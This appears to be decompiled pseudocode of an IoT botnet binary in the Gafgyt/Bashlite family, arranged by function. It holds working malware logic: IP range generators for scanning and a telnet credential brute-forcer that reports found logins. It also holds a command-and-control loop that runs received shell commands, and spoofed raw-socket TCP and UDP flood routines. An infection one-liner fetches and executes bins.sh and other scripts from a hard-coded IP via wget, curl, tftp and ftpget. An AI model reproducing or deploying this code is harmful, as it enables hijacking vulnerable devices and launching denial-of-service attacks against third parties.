        szprintf((int32_t)&v99, (int32_t)"123.17.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.18.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.19.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.20.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.21.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.22.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"222.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"222.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"222.254.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"222.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"37.247.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"41.208.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"183.220.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"175.201.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.198.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"183.223.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"50.205.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"88.248.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"88.105.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"88.247.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"85.105.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"188.3.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.203.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.55.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.220.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"183.233.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.242.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.198.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.14.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.195.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.203.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.214.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.218.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.225.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.228.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.231.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.60.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.248.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.35.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.49.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.62.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"144.48.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"163.47.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"163.53.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"223.29.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"59.153.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.175.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.177.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.183.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"202.164.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"203.134.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"210.56.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"49.156.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"203.210.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.181.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.178.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.177.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.170.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.171.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf(v101, (int32_t)"117.162.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf(v101, (int32_t)"112.26.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.27.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.28.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.29.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.30.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.31.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf(v102, (int32_t)"203.150.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
    return inet_addr(v102);
=================FUNCTION : main ===================
++++++++ FUNCTION START 17554
++++++++ FUNCTION END 18264
++++++++ FUNCTION LENGTH 710
    srand(v88 ^ __GI_getpid());
    init_rand(v89 ^ __GI_getpid());
    int32_t v90 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x11f10
        v91 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v105, 256);
            __GI_fclose((int16_t *)v91);
            while (true) {
                    sprintf(v109, (int32_t)"\"%s%s\"\n", v105, v107 + len2, (int32_t)&v103, (int32_t)&v103, (int32_t)&v103);
                    while (true) {
                        while (true) {
                                fgets((int32_t)&v96, 1024, v91);
                                if (__GI_strcasecmp((char *)&v96, v109) == 0) {
                                __GI_fclose(v110);
                                int32_t v112 = __GI_fopen((int32_t)v92, (int32_t)&v111); // 0x12098
                                    __GI_fclose((int16_t *)v112);
                                getOurIP();
                                v99 = __libc_fork();
                                    if (__libc_fork() == 0) {
                                        zprintf((int32_t)"fork failed\n");
                                    while (true) {
                                        if (initConnection() != 0) {
                                            while (true) {
                                                if (initConnection() == 0) {
                                            getBuild();
                                            __GI_inet_ntoa(v113);
                                            sockprintf(v94, (int32_t)"BUILD %s:%s");
                                            while (true) {
                                                while (true) {
                                                    if (recvLine(v94, (char *)&v97, 0x1000, v102) == -1) {
                                                    while (true) {
                                                                    if (__libc_waitpid(v121, 0, 1) >= 1) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                        free();
                                                            if (strstr(v102, "PING") == v102) {
                                                                sockprintf(v94, (int32_t)"PONG");
                                                                if (strstr(v102, "DUP") == v102) {
                                                                    zprintf((int32_t)"PEACE OUT IMMA DUP\n");
                                                            while (true) {
                                                                if (initConnection() == 0) {
                                                            while (true) {
                                                            while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        while (true) {
                                                                                        processCmd(v147, &v108);
                                                                                    processCmd(v147, &v108);
                                                                                while (true) {
                                                                                    free();
                                                                                while (true) {
                                                        if (__libc_waitpid(v121, 0, 1) < 1) {
                                        getBuild();
                                        __GI_inet_ntoa(v113);
                                        sockprintf(v94, (int32_t)"BUILD %s:%s");
                                    __libc_waitpid(v99, (int32_t)&v95, 0);
                                    zprintf((int32_t)"fork failed\n");
                                while (true) {
                                    if (initConnection() == 0) {
        getOurIP();
        v99 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v99, (int32_t)&v95, 0);
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v99 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v99, (int32_t)&v95, 0);
        zprintf((int32_t)"fork failed\n");
    while (true) {
        if (initConnection() == 0) {
    szprintf(v101, (int32_t)"%s 2>&1", v100, v101, (int32_t)&v103);
    int32_t v155 = fdpopen(v101, "r"); // 0x127cc
    while (true) {
        if (fdgets(v101, 1024, v155, v101) == 0) {
            fdpclose(v155);
            sockprintf(v94, (int32_t)"%s");
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 63025
++++++++ FUNCTION END 63773
++++++++ FUNCTION LENGTH 748
                    while (true) {
                        __open_nameservers();
                                v96 = socket((int32_t)v100, 2, 17);
                                    if (__libc_connect(v96, v101, 28) >= 0) {
                                        __libc_send(v96, v94, v128 + v130, v112);
                                        while (true) {
                                                int32_t result = __libc_recv(v96, v94, 512, 64, (int32_t)&v135); // 0x1c59c
                                                                        __GI_close(v96);
                                                                        free();
                                                                        free();
                                                                            while (true) {
                                                                                                    while (true) {
                                                                                                                            free();
                                                                                                                                __GI_close(v96);
                                                                                                                                    free();
                                                                                                                                free();
                                                                                                                                    __GI_close(v96);
                                                                                                                                        free();
                                                                                                                                    free();
                                                                                                                                free();
                                                                                                                            __GI_close(v96);
                                                                                                                                free();
                                                                                                                            free();
                                                                                                                            __GI_close(v96);
                                                                                                                                free();
                                                                                                                            free();
                                                                                                                        __GI_close(v96);
                                                                                                                            free();
                                                                                                                        free();
                                                                                                            __GI_close(v96);
                                                                                                                free();
                                                                                                            free();
                                                                                                        __GI_close(v96);
                                                                                                    free();
                                                                                                    free();
                                                                                                __GI_close(v96);
                                                                                                    free();
                                                                                                free();
                                                                                                free();
                                                                    free();
                                                                    free();
                                                                __GI_close(v96);
                                                                free();
                                                                free();
                                                            __GI_close(v96);
                                                            free();
                                                            free();
            free();
            free();
        __GI_close(v96);
    free();
    free();
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4462
++++++++ FUNCTION END 4866
++++++++ FUNCTION LENGTH 404
            v101 = __vfork();
                __GI_close(v97);
                __GI_close(v99);
                            __GI_close(v99);
                        __GI_close(v97);
                            __GI_close(v97);
                        __GI_close(v99);
                    __GI_close(v99);
                    __GI_close(v97);
        v100 = getdtablesize();
        v101 = __vfork();
            __GI_close(v97);
            __GI_close(v99);
                        __GI_close(v99);
                    __GI_close(v97);
                        __GI_close(v97);
                    __GI_close(v99);
                __GI_close(v99);
                __GI_close(v97);
        v101 = __vfork();
            __GI_close(v97);
            __GI_close(v99);
                        __GI_close(v99);
                    __GI_close(v97);
                        __GI_close(v97);
                    __GI_close(v99);
                __GI_close(v99);
                __GI_close(v97);
    v100 = getdtablesize();
    v101 = __vfork();
        __GI_close(v97);
        __GI_close(v99);
                    __GI_close(v99);
                __GI_close(v97);
                    __GI_close(v97);
                __GI_close(v99);
            __GI_close(v99);
            __GI_close(v97);
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 50506
++++++++ FUNCTION END 54325
++++++++ FUNCTION LENGTH 3819
                    while (true) {
                            while (true) {
                                while (true) {
                                while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                            while (true) {
                                            while (true) {
                while (true) {
            while (true) {
                while (true) {
            while (true) {
        while (true) {
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 43375
++++++++ FUNCTION END 44887
++++++++ FUNCTION LENGTH 1512
        while (true) {
            v108 = getuid();
            v109 = geteuid();
                v111 = getgid(v109);
                if (v111 == getegid()) {
                                while (true) {
                            while (true) {
                            while (true) {
                        while (true) {
                            while (true) {
                        while (true) {
                        while (true) {
                    while (true) {
                    while (true) {
                while (true) {
                while (true) {
            while (true) {
                    while (true) {
                while (true) {
                while (true) {
            while (true) {
                while (true) {
            while (true) {
            while (true) {
        while (true) {
        v108 = getuid();
        v109 = geteuid();
            v111 = getgid(v109);
            if (v111 == getegid()) {
                            while (true) {
                        while (true) {
                        while (true) {
                    while (true) {
                        while (true) {
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 11294
++++++++ FUNCTION END 11645
++++++++ FUNCTION LENGTH 351
        rand_cmwc();
    int32_t result = getHost(a1, &v94); // 0xfbfc
    int32_t v96 = socket(2, 3, 6); // 0xfc34
        result2 = sockprintf(v97, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v96, 0, 3, (int32_t)&v98, 4) < 0) {
        result2 = sockprintf(v97, (int32_t)"Failed setting raw headers mode.");
        makeIPPacket((char *)v102, v94, __GI_htonl(GetRandomIP(v99)), 6);
        *v104 = (int16_t)rand_cmwc();
        int32_t v105 = rand_cmwc(); // 0xfd8c
                while (true) {
                        if (__GI_strcoll(v121, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v121, (int32_t)"psh") == 0) {
                                        sockprintf(v97, (int32_t)"Invalid flag \"%s\"");
                rand_cmwc();
                    rand_cmwc();
                *v114 = (int16_t)tcpcsum(v102, v103);
                while (true) {
                    __libc_sendto(v96, v102, v100, 0, (int32_t)&v116, (int32_t)&v116);
                    v109 = GetRandomIP(v99);
                    *(int16_t *)(v102 | 4) = (int16_t)rand_cmwc();
                    *v106 = rand_cmwc();
                    *v104 = (int16_t)rand_cmwc();
                    *v114 = (int16_t)tcpcsum(v102, v103);
        rand_cmwc();
            rand_cmwc();
        *v114 = (int16_t)tcpcsum(v102, v103);
        while (true) {
            __libc_sendto(v96, v102, v100, 0, (int32_t)&v116, (int32_t)&v116);
            v109 = GetRandomIP(v99);
            *(int16_t *)(v102 | 4) = (int16_t)rand_cmwc();
            *v106 = rand_cmwc();
            *v104 = (int16_t)rand_cmwc();
            *v114 = (int16_t)tcpcsum(v102, v103);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 3025
++++++++ FUNCTION END 3548
++++++++ FUNCTION LENGTH 523
                while (true) {
                    printchar((int32_t *)a1, v99);
                        printchar((int32_t *)a1, v99);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v103);
                    printchar((int32_t *)a1, v99);
                printchar((int32_t *)a1, v99);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v103);
            printchar((int32_t *)a1, v99);
                while (true) {
                    printchar((int32_t *)a1, v99);
                        printchar((int32_t *)a1, v99);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v103);
                    printchar((int32_t *)a1, v99);
                printchar((int32_t *)a1, v99);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v103);
            printchar((int32_t *)a1, v99);
            while (true) {
                printchar((int32_t *)a1, v99);
                    printchar((int32_t *)a1, v99);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v103);
                printchar((int32_t *)a1, v99);
            printchar((int32_t *)a1, v99);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v103);
        printchar((int32_t *)a1, v99);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 22770
++++++++ FUNCTION END 23734
++++++++ FUNCTION LENGTH 964
                    v112 = v103 | (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n";
                if (__GI_open(v97, v102) < 0) {
                        free();
                    if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
            v107 = v99 & (int32_t)"nection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n" | 1;
                    if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
                    if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
                            free();
                    free();
                    v112 = v103 | (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n";
                if (__GI_open(v97, v102) < 0) {
                        free();
                    if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
            v107 = v99 & (int32_t)"nection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n" | 1;
                    if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
                    if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
                            free();
                    free();
                    free();
            v112 = v103 | (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n";
        if (__GI_open(v97, v102) < 0) {
                free();
            if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
    v107 = v99 & (int32_t)"nection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n" | 1;
            free();
        if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
        if ((v104 & (int32_t)"Connection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n") != 0) {
                free();
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 10166
++++++++ FUNCTION END 10849
++++++++ FUNCTION LENGTH 683
    srand(v94 ^ rand_cmwc());
        while (true) {
        while (true) {
                case 0: {
                        GetRandomPublicIP(24, v98, v110, v112);
                                    socket(2, 1, 0);
                                        if (__libc_connect(*v109, (int32_t)&v95, 16) == -1) {
                    socket(2, 1, 0);
                case 1: {
                    while (true) {
                        getsockopt(*v118, 1, 4, (int32_t)&v123, v123);
                case 2: {
                case 3: {
                    if (__libc_send(*v128, v129, len, 0x4000) < 0) {
                        if (__libc_send(*v128, (int32_t)"\r\n", 2, 0x4000) < 0) {
                case 4: {
                case 5: {
                    if (__libc_send(*v133, v134, len2, 0x4000) < 0) {
                        if (__libc_send(*v133, (int32_t)"\r\n", 2, 0x4000) < 0) {
                case 6: {
                                    get_telstate_host(v103, v98, v104);
                                    sockprintf(v139, (int32_t)"LOGIN FOUND - %s:%s:%s");
                case 7: {
                    __libc_send(*v140, (int32_t)"sh\r\n", 4, 0x4000);
                    __libc_send(*v140, (int32_t)"shell\r\n", 7, 0x4000);
                    if (__libc_send(*v140, str3, len3, 0x4000) < 0) {
    while (true) {
    while (true) {
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 10991
++++++++ FUNCTION END 11291
++++++++ FUNCTION LENGTH 300
        rand_cmwc();
    int32_t result = getHost(a1, &v96); // 0xf564
        int32_t v99 = socket(2, 2, 17); // 0xf5ac
            result3 = sockprintf(v98, (int32_t)"Failed opening raw socket.");
                makeRandomStr(v100, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v99, v100, a5, 0, (int32_t)&v95, 16);
                                rand_cmwc();
    int32_t v106 = socket(2, 3, 17); // 0xf738
        if (__GI_setsockopt(v106, 0, 3, (int32_t)&v107, 4) < 0) {
            result5 = sockprintf(v98, (int32_t)"Failed setting raw headers mode.");
                srand(v108 ^ rand_cmwc());
                init_rand(rand());
            makeIPPacket((char *)v111, v96, __GI_htonl(GetRandomIP(v109)), 17);
            *v112 = (int16_t)rand_cmwc();
                v113 = rand_cmwc();
            makeRandomStr(v111 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v106, v111, a5 + 28, 0, (int32_t)&v125, (int32_t)&v125);
                    *v112 = (int16_t)rand_cmwc();
                        v126 = rand_cmwc();
                    *(int16_t *)(v111 | 4) = (int16_t)rand_cmwc();
                    *(int32_t *)(v111 + 12) = __GI_htonl(GetRandomIP(v109));
    result5 = sockprintf(v98, (int32_t)"Failed opening raw socket.");
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 26315
++++++++ FUNCTION END 27348
++++++++ FUNCTION LENGTH 1033
        while (true) {
                while (true) {
                    while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                            while (true) {
                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                    while (true) {
                                        while (true) {
                                            while (true) {
    while (true) {
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 34896
++++++++ FUNCTION END 37727
++++++++ FUNCTION LENGTH 2831
                                                                free();
                                                            free();
                                                            free();
                                                        free();
                                                free();
                                            free();
                                            free();
                                        free();
        while (true) {
                    while (true) {
                            while (true) {
                                while (true) {
                                                                                            free();
                                                                                        free();
                                                                                        free();
                                                                                    free();
                                                                            free();
                                                                        free();
                                                                        free();
                                                                    free();
                while (true) {
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 64740
++++++++ FUNCTION END 65173
++++++++ FUNCTION LENGTH 433
    int32_t v101 = __get_hosts_byname_r(str, 2, v96, v97, v98, v100, v99); // 0x1d064
                    if (inet_aton((char *)str, v114 + 16) != str2) {
                    if (__dns_lookup((char *)str, 1, (int32_t)&v104, v115) < 0) {
                            free();
                            free();
                        free();
                        free();
                            if (inet_aton((char *)str, v114 + 16) != str2) {
                            if (__dns_lookup((char *)str, 1, (int32_t)&v104, v115) < 0) {
                                    free();
                                    free();
                                free();
                                free();
                if (inet_aton((char *)str, v114 + 16) != str2) {
                if (__dns_lookup((char *)str, 1, (int32_t)&v104, v115) < 0) {
                        free();
                        free();
                    free();
                    free();
=================FUNCTION : _init ===================
++++++++ FUNCTION START 388
++++++++ FUNCTION END 665
++++++++ FUNCTION LENGTH 277
        "etrbhhgetrb",
        "close",
        "accept"
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5"
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
    char (*v75)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "telnet",
        "telnet"
        "telnet"
        "/dev/netslink/",
=================FUNCTION : _memcpy ===================
++++++++ FUNCTION START 54724
++++++++ FUNCTION END 56551
++++++++ FUNCTION LENGTH 1827
                            while (true) {
                        while (true) {
                        while (true) {
                        while (true) {
                            while (true) {
                            while (true) {
                            while (true) {
                        while (true) {
                                while (true) {
                                        while (true) {
                                while (true) {
                                while (true) {
                        case -1: {
                                while (true) {
                        case -2: {
                                while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 17210
++++++++ FUNCTION END 17450
++++++++ FUNCTION LENGTH 240
    int32_t v95 = socket(2, 2, 0); // 0x11b38
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v95, (int32_t)&v96, 16) == -1) {
    if (__GI_getsockname(v95, v99, (int32_t)&v97, v99, 16) == -1) {
        int32_t v102 = __GI_open((int32_t)"/proc/net/route", 0); // 0x11c28
        while (true) {
            if (fdgets(v104, 0x1000, v102, v104) != 0) {
                if (strstr(v104, "\t00000000\t") != 0) {
                        __GI_close(v102);
                            __GI_close(v95);
                        __GI_close(v95);
                    __GI_close(v102);
                        __GI_close(v95);
                    __GI_close(v95);
            __GI_close(v102);
                __GI_close(v95);
            __GI_close(v95);
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 64127
++++++++ FUNCTION END 64520
++++++++ FUNCTION LENGTH 393
        int32_t v105 = __GI_fopen(v94 - 0x8620, v94 - 0x89f0); // 0x1cb4c
            if (fgets(v116, 128, v105) != 0) {
                while (true) {
                        if (inet_pton(10, (char *)v118, (int32_t)&v122) < 1) {
                            if (inet_pton(2, (char *)v118, (int32_t)&v125) >= 1) {
                            if (fgets(v116, 128, v105) == 0) {
                        if (fgets(v116, 128, v105) == 0) {
                            while (true) {
                                free();
                        while (true) {
                        if (fgets(v116, 128, v105) == 0) {
                __GI_fclose((int16_t *)v105);
                    if (__GI_gethostname(v109, 255) == 0) {
                                        free();
            __GI_fclose((int16_t *)v105);
            if (__GI_gethostname(v109, 255) == 0) {
                    free();
=================FUNCTION : gethostbyname2_r ===================
++++++++ FUNCTION START 58428
++++++++ FUNCTION END 58792
++++++++ FUNCTION LENGTH 364
        result = gethostbyname_r();
                int32_t v99 = __get_hosts_byname_r(a1, a2, v96, a4, a5, a6, a7); // 0x1af50
                                if (inet_pton(10, (char *)a1, v107) == v100) {
                                        while (true) {
                                            v109 = __dns_lookup((char *)v101, 28, v108, (int32_t)&v103);
                    if (inet_pton(10, (char *)a1, v107) == v100) {
                            while (true) {
                                v109 = __dns_lookup((char *)v101, 28, v108, (int32_t)&v103);
                if (inet_pton(10, (char *)a1, v107) == v100) {
                        while (true) {
                            v109 = __dns_lookup((char *)v101, 28, v108, (int32_t)&v103);
                                free();
                                        free();
                                    free();
                                free();
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 66290
++++++++ FUNCTION END 66530
++++++++ FUNCTION LENGTH 240
            int32_t v99 = __open_etc_hosts(); // 0x1d734
        while (true) {
                    __GI_config_close((int32_t *)v97);
                        if (inet_pton(v111, (char *)v112, v104) >= 1) {
                            __GI_config_close((int32_t *)v97);
                            if (inet_pton(10, (char *)v113, v104) >= 1) {
                                __GI_config_close((int32_t *)v97);
        while (true) {
            if (__GI_strcasecmp(v107, v109) == 0) {
        while (true) {
            __GI_config_close((int32_t *)v97);
=================FUNCTION : print ===================
++++++++ FUNCTION START 3764
++++++++ FUNCTION END 4149
++++++++ FUNCTION LENGTH 385
    while (true) {
                    printchar(a1, (int32_t)*v99);
